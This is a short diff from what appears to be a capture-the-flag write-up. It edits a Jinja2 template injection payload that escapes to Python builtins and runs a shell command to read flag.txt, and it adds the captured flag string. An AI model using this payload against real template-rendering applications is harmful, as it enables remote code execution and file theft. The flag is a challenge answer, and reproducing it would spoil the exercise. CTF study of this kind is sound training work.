@@ -65,5 +65,9 @@ Read flag.txt:
 
 jinja2
 Copy
-{{ self.__init__.__globals__.__builtins__.eval("__import__('os').popen('cat /path/to/flag.txt').read()") }}
+{{ self.__init__.__globals__.__builtins__.eval("__import__('os').popen('cat ./flag.txt').read()") }}
 Output: The contents of flag.txt.
+
+## FLAG 
+
+CTF{khoya_7na_mzrobin_3tih_flag_a_rabi3a}
